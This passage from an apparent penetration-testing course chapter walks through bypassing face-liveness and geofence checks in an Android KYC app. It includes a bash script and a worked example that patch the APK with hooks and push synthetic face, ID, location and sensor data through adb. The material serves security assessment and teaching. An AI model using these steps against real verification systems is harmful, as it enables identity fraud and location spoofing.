If the hook tag appears, the hook is firing. If it does not appear, the app has not reached the code path that triggers the hook -- you may be on the wrong screen, or the app uses a different API than you expected.

**Check delivery vs. consumption.** Delivered means your data was injected into the pipeline. Consumed means the app's code actually read it. A gap between the two suggests the app is dropping frames (normal under load) or the SDK is pre-filtering before processing.

**Check for errors.** Search for exceptions or error tags:

```bash
grep -i "error\|exception\|fail" delivery_log.txt
```

The runtime catches most errors gracefully and logs them. An IOException reading your config file, a malformed JSON, a missing frame directory -- these will appear as error lines in the log.

### Scripting the Whole Operation

For repeatable engagements or CI/CD integration, the entire execute phase can be a shell script. This is especially useful for regression testing -- re-running the same bypass after the client ships a new version to verify whether the vulnerabilities have been fixed.

```bash
#!/bin/bash
set -e

PKG="com.poc.biometric"
LAUNCHER="com.poc.biometric.ui.LauncherActivity"
EVIDENCE_DIR="./evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[+] Pushing payloads..."
adb push face_neutral/ /sdcard/poc_frames/face_neutral/
adb push id_card/ /sdcard/poc_frames/id_card/
adb push location_config.json /sdcard/poc_location/config.json
adb push sensor_holding.json /sdcard/poc_sensor/config.json

echo "[+] Starting logcat capture..."
adb logcat -c
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor,HookEngine \
  > "$EVIDENCE_DIR/delivery_log.txt" &
LOGPID=$!

echo "[+] Launching app..."
adb shell am start -n "$PKG/$LAUNCHER"
sleep 5

echo "[+] Capturing step 1 (face)..."
adb exec-out screencap -p > "$EVIDENCE_DIR/step1_face.png"

echo "[+] Waiting for liveness to complete..."
sleep 20

echo "[+] Switching to document frames..."
adb shell rm -rf /sdcard/poc_frames/*
adb push id_card/ /sdcard/poc_frames/id_card/
adb push sensor_still.json /sdcard/poc_sensor/config.json
sleep 10

echo "[+] Capturing step 3 (document)..."
adb exec-out screencap -p > "$EVIDENCE_DIR/step3_document.png"

echo "[+] Stopping logcat..."
kill $LOGPID

echo "[+] Delivery statistics:"
echo "  Frames delivered:   $(grep -c 'FRAME_DELIVERED' "$EVIDENCE_DIR/delivery_log.txt")"
echo "  Frames consumed:    $(grep -c 'FRAME_CONSUMED' "$EVIDENCE_DIR/delivery_log.txt")"
echo "  Locations delivered: $(grep -c 'LOCATION_DELIVERED' "$EVIDENCE_DIR/delivery_log.txt")"
echo "  Sensor events:      $(grep -c 'SENSOR_DELIVERED' "$EVIDENCE_DIR/delivery_log.txt")"

echo "[+] Evidence saved to $EVIDENCE_DIR"
echo "[+] Done."
```

That is your engagement in a script. Recon told you the targets. The patch-tool armed the hooks. The payloads loaded the data. The script ran the operation. The log captured the evidence. All that is left is the report.

For real engagements, you will likely need to adjust the `sleep` values and add interactive steps where the flow requires user input (tapping "next," confirming a prompt). But the structure remains the same: push, launch, wait, capture, extract.

---

## The Operator's Mindset

A few principles that apply to every engagement, regardless of target complexity. These are not platitudes -- they are hard lessons from operations that went wrong because someone ignored them.

**Recon drives everything.** The quality of your execution is capped by the quality of your recon. A 30-minute recon that catches every hook surface, extracts exact geofence coordinates, and identifies the liveness challenge type means a clean, single-attempt execution. A 5-minute skim that misses the sensor check means a failed liveness step and a restart. Every time you feel the urge to skip a grep and start patching, remind yourself: the search takes 2 seconds, the failed execution takes 20 minutes.

**Pre-stage everything.** Push all payloads before launch. All three subsystems auto-enable independently. If everything is on the device before the first Activity loads, every data source is compromised from the very first API call. No race conditions, no timing issues, no manual intervention required during the critical early seconds of app initialization.

**Evidence is non-negotiable.** Start logcat before launch. Screenshot every step. Save the patch output. These are not optional extras -- they are the deliverables. Without evidence, you have an anecdote. With evidence, you have a finding. A finding goes in a report. A report goes to the client. The client fixes the vulnerability. That is the chain. Break any link and the engagement produced no value.

**Iterate, don't brute-force.** When a step fails, check logcat first. Was the hook invoked? Was the data delivered? Was it accepted? The answer is always in the logs. Adjust the payload, not the approach. The hooks are reliable -- it is usually the data that needs tuning. Wrong coordinates, insufficient frame quality, mismatched sensor values. Each iteration gives you more diagnostic information. By the third attempt, you know exactly what the SDK expects and can give it exactly that.

**The report is the product.** The bypass itself is the means; the report is the end. A well-written engagement report with specific, actionable recommendations is what the client pays for. It is what gets vulnerabilities fixed. It is what demonstrates the value of the assessment. It is what justifies the next assessment. Write it like someone's security budget depends on it -- because it probably does.

---

## Putting It Together: A Worked Example

To ground all of this in something concrete, here is a compressed walkthrough against the practice target, `com.poc.biometric`. This is the same flow you will execute in Lab 6, condensed here to show the full cycle.

**Recon findings:**

```text
Camera:   CameraX ImageAnalysis$Analyzer in CameraFragment
Location: onLocationResult in LocationActivity, isFromMockProvider present
Sensors:  onSensorChanged not found (no sensor listener registered)
Geofence: Times Square (40.7580, -73.9855) hardcoded in strings
Liveness: Passive (no active challenge prompts found)
```

Sensor hooks will be skipped by the patch-tool since there is no `onSensorChanged` in the target. That simplifies the operation -- two subsystems instead of three.

**Preparation:**

```bash
java -jar patch-tool.jar course-1/targets/target-kyc-basic.apk \
  --out patched.apk --work-dir ./work 2>&1 | tee patch_output.txt

adb install -r patched.apk
adb shell pm grant com.poc.biometric android.permission.CAMERA
adb shell pm grant com.poc.biometric android.permission.ACCESS_FINE_LOCATION
adb shell appops set com.poc.biometric MANAGE_EXTERNAL_STORAGE allow

adb push face_neutral/ /sdcard/poc_frames/face_neutral/
echo '{"latitude":40.7580,"longitude":-73.9855,"altitude":5.0,"accuracy":8.0}' \
  > loc.json && adb push loc.json /sdcard/poc_location/config.json
```

**Execution:**

```bash
adb logcat -c
adb logcat -s FrameInterceptor,LocationInterceptor,HookEngine > delivery_log.txt &
LOGPID=$!

adb shell am start -n com.poc.biometric/com.poc.biometric.ui.LauncherActivity
# Navigate through the face capture step
adb exec-out screencap -p > step1_face.png
# Navigate to the location verification step
adb exec-out screencap -p > step2_location.png

kill $LOGPID
```

**Reporting:**

```bash
echo "Frames delivered: $(grep -c FRAME_DELIVERED delivery_log.txt)"
echo "Frames consumed:  $(grep -c FRAME_CONSUMED delivery_log.txt)"
echo "Locations:        $(grep -c LOCATION_DELIVERED delivery_log.txt)"
```

Result: full bypass. Both the face check and geofence pass with synthetic data. The delivery log shows 45+ frames delivered and consumed, 12+ locations delivered. The engagement report documents the finding and recommends server-side liveness verification as the primary mitigation.

---

## What Comes Next

This chapter gave you the operational methodology -- the four-phase cycle that structures every engagement. Chapter 11 goes deeper on the reporting side: evidence standards, how to write findings that get taken seriously, and the art of recommendations that actually lead to fixes.

Complete **Lab 6: Full Engagement** to practice the entire cycle end-to-end against the practice target. The lab walks you through all four phases with checkpoints at each transition. By the end, you will have a complete engagement report -- your first deliverable.
